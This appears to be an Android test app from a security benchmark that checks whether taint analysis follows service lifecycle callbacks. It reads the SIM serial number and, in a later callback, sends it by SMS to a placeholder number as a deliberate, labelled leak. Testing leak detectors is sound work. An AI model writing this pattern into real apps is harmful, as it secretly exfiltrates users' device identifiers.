package de.ecspride;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
/**
 * @testcase_name ServiceLifecycle1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description A source is called and stored to a variable in one callback method,
 *  the variable is passed to a sink in another callback method
 * @dataflow onStartCommand: source -> secret; onLowMemory: secret -> sink
 * @number_of_leaks 1
 * @challenges the analysis must be able to handle the service lifecycle correctly 
 */
public class MainService extends Service {
	private String secret = null;
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		secret = telephonyManager.getSimSerialNumber(); //source
		return 0;
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO for communication return IBinder implementation
		return null;
	}
	
	@Override
	public void onLowMemory(){
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, secret, null, null);   //sink, leak
  	}

}
